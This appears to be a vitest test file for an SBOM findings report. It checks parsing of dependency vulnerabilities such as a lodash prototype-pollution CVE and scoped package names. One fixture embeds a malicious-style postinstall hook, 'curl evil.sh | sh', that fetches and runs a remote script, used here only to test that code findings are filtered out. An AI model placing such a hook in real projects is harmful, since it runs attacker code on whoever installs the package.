import { describe, expect, it } from "vitest";
import { buildSbomReport, isSbomFinding, type SbomFindingInput } from "./findings-report";

/** A row shaped the way `sbomWorker` persists a dependency finding. */
function dependencyFinding(overrides: Partial<SbomFindingInput> = {}): SbomFindingInput {
  return {
    type: "VULNERABILITY",
    severity: "HIGH",
    fileLocation: "package.json",
    codeSnippet: "Dependency: lodash@4.17.20\nPatched: 4.17.21",
    explanation: "Prototype pollution in lodash (CVE-2021-23337).",
    ...overrides,
  };
}

describe("isSbomFinding", () => {
  it("recognises the rows the SBOM worker writes", () => {
    expect(isSbomFinding(dependencyFinding())).toBe(true);
    expect(
      isSbomFinding(dependencyFinding({ fileLocation: "services/api/requirements.txt" })),
    ).toBe(true);
  });

  it("ignores code findings, including a VULNERABILITY in a manifest", () => {
    expect(
      isSbomFinding(
        dependencyFinding({ fileLocation: "src/db.ts", codeSnippet: "db.query(sql + id)" }),
      ),
    ).toBe(false);
    expect(
      isSbomFinding(dependencyFinding({ codeSnippet: '"postinstall": "curl evil.sh | sh"' })),
    ).toBe(false);
    expect(isSbomFinding(dependencyFinding({ type: "SECRET" }))).toBe(false);
  });
});

describe("buildSbomReport", () => {
  it("returns null when the page has no dependency findings", () => {
    expect(buildSbomReport([])).toBeNull();
    expect(buildSbomReport([dependencyFinding({ type: "MISCONFIG" })])).toBeNull();
  });

  it("builds the card from the stored snippet and explanation", () => {
    const report = buildSbomReport([dependencyFinding()]);

    expect(report).toMatchObject({
      totalDependencies: 1,
      status: "VULNERABLE",
      vulnerabilities: [
        {
          dependency: {
            name: "lodash",
            version: "4.17.20",
            manifestFile: "package.json",
            ecosystem: "npm",
          },
          cveId: "CVE-2021-23337",
          severity: "HIGH",
          description: "Prototype pollution in lodash (CVE-2021-23337).",
          patchedVersion: "4.17.21",
        },
      ],
    });
  });

  it("splits a scoped package name at its last @ and handles an unknown patch", () => {
    const report = buildSbomReport([
      dependencyFinding({
        severity: "INFO",
        fileLocation: "requirements.txt",
        codeSnippet: "Dependency: @babel/traverse@7.22.0\nPatched: Unknown",
        explanation: null,
      }),
    ]);

    expect(report?.status).toBe("WARNING");
    expect(report?.vulnerabilities[0]).toMatchObject({
      dependency: { name: "@babel/traverse", version: "7.22.0", ecosystem: "pypi" },
      cveId: "CVE-Aggregated",
      severity: "LOW",
      description: "",
      patchedVersion: null,
    });
  });
});
